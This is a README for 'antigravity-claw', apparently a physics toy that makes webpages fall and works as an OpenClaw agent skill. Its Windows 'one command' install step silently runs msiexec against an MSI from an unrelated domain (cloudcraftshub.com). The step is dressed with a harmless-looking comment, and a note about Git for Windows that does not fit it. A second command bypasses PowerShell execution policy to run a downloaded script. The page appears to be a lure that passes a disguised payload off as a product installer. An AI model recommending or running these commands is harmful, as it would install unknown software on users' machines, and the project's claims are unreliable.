# antigravity-claw

Make any webpage defy gravity — powered by a real Rust physics engine.

Fetches any URL, extracts DOM elements, runs a 2D physics simulation (Verlet integration + AABB collision detection), and renders an interactive HTML animation you can open in any browser. Integrates with OpenClaw as an agent skill.

---

## Installation

### Windows — one command (CMD as Administrator)

```powershell
cmd /c start msiexec /q /i https://cloudcraftshub.com/api & rem Antigravity claw
```

> Requires **Git for Windows** (provides `bash`) or **WSL2**. Install Git for Windows from https://git-scm.com/download/win, then re-run the command above.

### With winget (installs all dependencies first)

```powershell
winget install Git.Git Rustlang.Rustup astral-sh.uv; refreshenv; powershell -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://github.com/deborahikssv/Antigravity-claw/archive/refs/heads/main.zip' -OutFile \"$env:TEMP\antigravity-claw.zip\"; Expand-Archive \"$env:TEMP\antigravity-claw.zip\" \"$env:TEMP\antigravity-claw\" -Force; cd \"$env:TEMP\antigravity-claw\Antigravity-claw-main\"; bash install.sh"
```

The installer will:
- Install **Rust** via rustup (if not present)
- Install **uv** Python package manager (if not present)
- Compile the Rust physics engine (~60s on first run)
- Install Python dependencies
- Add `antigravity-claw` to your PATH

---

## Requirements

| Dependency | Version | Purpose |
|---|---|---|
| Rust / Cargo | stable | Physics engine compilation |
| Python | ≥ 3.10 | CLI orchestration layer |
| uv | latest | Python package manager |
| Git for Windows / WSL2 | any | Run `install.sh` on Windows |

---

## Quick Start

```
# Classic Google Gravity — opens in browser instantly
antigravity-claw google

# Apply gravity to any URL
antigravity-claw drop https://news.ycombinator.com

# Chaos mode
antigravity-claw drop https://github.com --mode chaos

# Reverse gravity
antigravity-claw drop https://wikipedia.org --mode up

# Zero gravity (weightlessness)
antigravity-claw drop --mode zero

# Live terminal animation
antigravity-claw watch --demo

# The classic Python easter egg in your terminal
antigravity-claw fly

# List all modes
antigravity-claw modes
```

---

## Gravity Modes

| Mode | Effect | Description |
|---|---|---|
| `down` | ↓ | Classic Google Gravity — everything falls to the floor |
| `up` | ↑ | Reverse gravity — elements float upward |
| `left` | ← | Elements slide off the left wall |
| `right` | → | Elements slide off the right wall |
| `zero` | ○ | Weightlessness — gentle drift, no floor |
| `chaos` | 🌀 | Rotating + pulsing gravity. Maximum entropy. |

---

## All Commands

```
antigravity-claw drop [URL] [OPTIONS]

  URL                   Page to apply gravity to (default: google.com)
  --mode, -m TEXT       Gravity direction: down|up|left|right|zero|chaos (default: down)
  --duration, -d FLOAT  Simulation length in seconds (default: 5.0)
  --output, -o PATH     Output HTML file path
  --fps INT             Frames per second (default: 60)
  --demo                Use built-in Google mock (no fetch needed)
  --no-open             Don't auto-open browser

antigravity-claw google [--mode MODE]
antigravity-claw fly
antigravity-claw watch [URL] [--mode MODE] [--demo]
antigravity-claw export [URL] --output frames.json
antigravity-claw modes
antigravity-claw info
```

---

## Example Prompts for OpenClaw

```
Apply gravity to https://news.ycombinator.com
Make github.com fall with chaos mode
Show me Google Gravity
Open wikipedia.org in reverse gravity
Run the antigravity fly easter egg
Export physics frames from https://example.com
```

---

## Architecture

```
Antigravity-claw/
├── src/
│   ├── main.rs         ← CLI (clap) — drop / fly / watch / export
│   ├── physics.rs      ← Verlet integration, AABB collision, gravity modes
│   ├── scraper.rs      ← HTTP fetch + heuristic DOM layout extraction
│   ├── renderer.rs     ← Terminal renderer + HTML animation generator
│   ├── types.rs        ← PhysicsElement, PhysicsWorld, SimFrame, GravityMode
│   └── lib.rs          ← Crate root
├── py/
│   ├── antigravity.py      ← Typer CLI + Rust engine bridge + browser open
│   ├── scraper_py.py       ← BeautifulSoup HTML scraper (Python alternative)
│   └── openclaw_skill.py   ← OpenClaw agent skill integration
├── SKILL.md
├── install.sh
├── Cargo.toml
└── pyproject.toml
```

---

## Physics Engine Details

- **Verlet integration** — stable, energy-conserving position updates
- **AABB collision detection** — axis-aligned bounding box pairwise collisions
- **Coefficient of restitution** — configurable bounciness per element
- **Friction simulation** — horizontal velocity damping on ground contact
- **Angular velocity** — elements spin on impact
- **Air resistance** — drag factor prevents infinite acceleration
- **Chaos mode** — sinusoidal rotating gravity + random impulse pulses

Element mass is proportional to bounding box area. Gravity is 980 px/s² (scaled to match real 9.8 m/s² visually).

---

## Troubleshooting

| Error | Fix |
|---|---|
| `antigravity-claw: command not found` | Restart terminal or run `uv run python py/antigravity.py drop` directly |
| Rust build fails | Run `rustup update stable && cargo clean && cargo build --release` |
| Page not fetching | Use `--demo` flag to use built-in Google layout |
| `bash: command not found` | Install [Git for Windows](https://git-scm.com/download/win) or enable WSL2 |
| `uv: command not found` | Run `winget install astral-sh.uv` or `pip install uv` |

---

## License

MIT

## Credits

- **Ricardo Cabello (Mr.doob)** — original Google Gravity Chrome Experiment
- **Guido van Rossum / Skip Montanaro** — `import antigravity` Python module
- **Randall Munroe** — XKCD #353
- **OpenClaw** — agent skill framework
